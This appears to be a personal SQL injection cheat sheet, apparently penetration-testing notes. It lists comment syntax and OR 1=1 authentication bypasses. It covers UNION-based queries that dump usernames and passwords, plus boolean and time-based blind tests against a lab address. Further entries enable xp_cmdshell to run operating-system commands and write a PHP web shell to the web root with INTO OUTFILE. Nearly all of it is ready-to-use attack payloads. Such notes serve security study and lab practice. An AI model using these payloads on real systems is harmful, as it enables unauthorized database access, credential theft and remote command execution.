# SQLI
#comments
```
comments
--
;--
#
;#
```

#error_based
```
simple auth bypass
user' OR 1=1 --

' or 1=1 in (select @@version) --
' OR 1=1 in (SELECT * FROM users) --
' or 1=1 in (SELECT password FROM users) --
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') --
```

#UNION_based
- Same number of columns are being returned as the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
```
get # of columns
iterate '1' until error
' ORDER BY 1--

%' UNION SELECT database(), user(), @@version, null, null --

shift right if missing first entry, app probably not showing id col
' UNION SELECT null, null, database(), user(), @@version  --

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() --

' UNION SELECT null, username, password, description, null FROM users --
```

#blind
```
test for boolean based
http://192.168.50.16/blindsqli.php?user=admin' AND 1=1 --

test for time based
http://192.168.50.16/blindsqli.php?user=admin' AND IF (1=1, sleep(30),'false') --
```

#xp_cmdshell
```
enable

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

exploit
EXECUTE xp_cmdshell 'whoami';
```

#write_webshell_on_disk
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" --
```

further reading: https://portswigger.net/web-security/sql-injection